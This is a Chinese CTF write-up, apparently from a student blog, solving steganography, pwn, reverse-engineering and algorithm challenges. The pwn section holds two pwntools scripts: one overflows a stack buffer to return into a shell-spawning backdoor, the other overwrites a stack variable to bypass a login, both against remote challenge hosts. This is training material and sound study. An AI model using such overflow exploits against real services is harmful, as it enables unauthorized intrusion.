# Writeup
## Misc
#### HiddenImage
010 打开发现图片后面粘连了 zip 文件
zip 文件里有一个 getflag.jpg 文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831222716250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
Kali 使用 binwalk -e 分离出 getflag.jpg
同样使用 010 查看,发现文件末尾有一段 url 编码 ~~(应该是吧)~~
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831223643425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
复制到 Google 搜索框回车,得到 flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831223716531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
`flag: flag{h1d3_1m@g3_s0_3Asy}`
#### 问卷题
这个根据心情填就好了 ~~(手动滑稽)~~

## Pwn
#### babybabystack
简单的 ROP
checksec 检查发现:
32 位,开了 NX,不能直接执行栈上的数据
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831225607195.png)
用 IDA 反汇编
发现漏洞存在于 main 函数后的 vulnerable_function 函数中的 read 函数上
可以用来覆盖 ebp 控制执行的函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901082109863.png)

看到 _system() 函数
有个 back_door 函数调用

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831225844777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

back_door 函数直接包含 sh
得到 bin 地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831230108963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

回看 buf 的地址,以 ebp 为索引
无需调试,直接使用偏移量

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831230057302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
```python
from pwn import *


#p=process('./babybabystack')

p=remote('148.70.206.225',50001)

bin_addr=0x8048569

pay='a'*(0x1c+4)+p32(bin_addr)
p.sendline(pay)

p.interactive()
```
得到 flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019083123091338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

`flag: flag{5t4ck_0v3rF10w_15_u53fu1}`

#### string&float

checksec 检查
64 位,开了 NX 和 Canary,心里慌得一批

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831231416837.png)

上 IDA
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019083123245019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
可以看出得到 flag 的条件是 login 函数返回 true
v4 等于 pai

首先来看 login 函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831232744883.png)
返回 verifykey 函数的返回值
verifykey 函数就是比较 v2 和 v3 是否相等
相等返回 1,不相等返回 0
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831233018573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
v2 的值可以通过 password 出的读入控制
但是 v3 是 generateKey 函数生成的随机数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831233340170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
注意到还有一个 buf 读入
查看两者的地址发现可以通过 buf 改写 v3 的值
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831233712448.png)
通过向 buf[0x40-0x20] 处写入可以修改 v3 的值
即把 v2 和 v3 都改成 0
```python
buf=0x20
v2=0

p.recvuntil('name:\n')
p.sendline(p64(buf))

p.recvuntil('password:\n')
p.sendline(p64(v2))
```
绕过 login,然后是 v4 等于 pai 

(以下为个人理解,但感觉有些地方有点问题)

看到 int 类型 pai 的 float 强制转换,加上 v4 是 float 类型并且变量名是 pai
自然联想到圆周率,恰好 pai 转换出来的数是 3.1415... 
然后就信以为真,提交 3.1415...
然而是个小坑

v4 确实是 float 类型,但在输入的时候
scanf 函数的格式化字符指定的是 %ud (无符号整形)
v4 和 pai 都进行了强制转换
也就是说输入的数等于 pai 的整形就可以了
即直接提交 1078530000(0x40490FD0)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831235544453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

```python
from pwn import *
#p=process('./pwn1')
p=remote('188.131.218.201',10001)
buf=0x20
v2=0
p.recvuntil('name:\n')
p.sendline(p64(buf))
p.recvuntil('password:\n')
p.sendline(p64(v2))
p.recvuntil('pai?\n')
p.sendline('1078530000')
p.interactive()
```
得到 flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190831235653284.png)
`flag: flag{C_sTr1ng__3nD_f10aT}`
## Re
#### maze
看着题面描述猜测是一道迷宫题
IDA 验证也确实是一道迷宫题
先看看反汇编代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901083325471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901083337368.png)

有一个 check 函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019090108392729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

以 map 数组为地图,v5 为 map 索引,v6 为输入的字符串索引
把 w s a d 定义为上下左右 ~~(突然想念 4399 )~~

如果 map[v5] 等于 * 或者 # 就退出
map[v5] 等于 & 并且 v6 等于 55 时正确

进一步由上下 +-50 推知 map 每行长为 50
输入长为 55

然后寻找地图

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901085400550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)

导出后每行 50 整理得
```
****#*********************************************
****!!********************************************
*****!**!!!!************!!!!!*********************
*****!!!!**!************!***!*********************
***********!************!***!!!!!!!***************
***********!************!*********&***************
***********!!***********!*************************
************!!!!!*******!*************************
****************!!!*****!*************************
******************!*****!*************************
******************!!!!**!*************************
*********************!!!!*************************
**************************************************
**************************************************
**************************************************
```
回看了一下 v5,开始时被赋值为 4
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901085146373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
和地图完全吻合,感觉自己萌萌哒
然后得到 `sdssdddwdddssssdsddddsddssdddsdddwwwwwwwwwddddssdddddds`
自信满满提交一波,心中暗爽
然后 wrong 掉......

反复确认地图,没发现问题
只能上 edb 动态调试
还好流程比较简单,发现第 16,17 步的拐角出了问题
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901090632857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
我是真的不知道得到的地图为啥会有问题
菜到离世

得到正确的 flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901091141831.png)
`flag: flag{sdssdddwdddsssssdddddsddssdddsdddwwwwwwwwwddddssdddddds}`

#### Baby Protection
一道安卓逆向
去年是 RSA,今年是 DES
用 d2j-dex2jar 得到 jar 包
用 Java_Decompiler 打开阅读源码
没学过 Java,看不太懂,也不太懂术语
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901092324280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
check 函数返回 true 时正确
查看 check 函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901092627273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
如果输入不包含 flag,返回 false
将 enc1,2,3 拼接在 localObject 中
str 经过 base64 加密
将输入和 str 传入 CryptoUtil 类中的 encode 函数
加密后的返回值与 localObject 比较,相等返回 true,否则 false
然后进入 CryptoUtil.encode 查看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901094547620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
代码确实看不懂,但有明确的 DES 字符提示
猜测为 DES 加密
str 应该就是密匙,localObject 为密文
github 上找了个 DES 脚本
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190901094948716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MjYyNzM5,size_16,color_FFFFFF,t_70)
一开始不知道密匙是 8 位,解出来的 flag,有点问题
真正的密匙应该是 str base64 加密后的前 8 位
得到 flag
`flag: flag{E4Sy_De5_4nDr01d_pR0teCt!}`

----
## PPC
#### 四暗刻单骑
模拟
开一个数组记录相应的牌的数量
当且仅当有 5 种牌,除其中一种为一张,其余 4 种大于一张
输出只有一张的那一种牌
```cpp
#include<cstdio>
#include<cstring>
#include<algorithm>
using namespace std;
char str[10];
int card[110];
int main(){
	for(int i=1;i<=13;i++){//记录每种牌的数量
		scanf("%s",str);
		if(str[1]=='m'){
			card[str[0]-'0']++;
		}
		if(str[1]=='s'){
			card[str[0]-'0'+9]++;
		}
		if(str[1]=='p'){
			card[str[0]-'0'+18]++;
		}
		if(str[1]=='z'){
			card[str[0]-'0'+27]++;
		}
	}
	int ans=0,bns=0;
	for(int i=1;i<=34;i++){
		if(card[i])ans++;//记录一共有几种牌
	}
	if(ans>5||ans<5){
		printf("No Solution\n");
		return 0;
	}
	for(int i=1;i<=34;i++){
		if(card[i]==1)bns=i;//记录只有一张的牌的种类
	}
	if(bns){
		if(bns<10)printf("%dm\n",bns);
		else if(bns<19)printf("%ds\n",bns-9);
		else if(bns<28)printf("%dp\n",bns-18);
		else printf("%dz\n",bns-27);
	}
	else printf("No Solution\n");
	return 0;
}
```
#### 死锁
看完题发现就是有向图求环
有 DFS 和 拓扑排序两种解法
但数据规模比较小,DFS 就好了 ~~(绝对不是写不出拓扑)~~
算是模板题
```cpp
#include<cstdio>
#include<cstring>
#include<algorithm>
using namespace std;
const int maxn=1100;
int n,m;
bool map[maxn][maxn];
int used[maxn];
void dfs(int a){
	used[a]=1;//打上标记
	for(int i=0;i<n;i++){
		if(map[a][i]==true){
			if(used[i]==true){//已经标记过说明形成了环
				printf("Y\n");
				exit(0);
			}
			else if(used[i]==-1) continue;//访问过的直接跳过
			else dfs(i);
		}
	}
	used[a]=-1;//标记为访问过
}
int main(){
	int a;
	scanf("%d",&n);
	for(int i=0;i<n;i++){
		scanf("%d",&m);
		for(int j=1;j<=m;j++){
			scanf("%d",&a);//邻接矩阵建图
			map[a][i]=true;
		}
	}
	for(int i=0;i<n;i++){
		if(used[i]==-1) continue;//访问过就跳过
		else dfs(i);
	}
	printf("N\n");
	return 0;
}
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjExNTExNTcxMiw2OTc3OTExODgsLTM5Nz
kyNzQxNF19
-->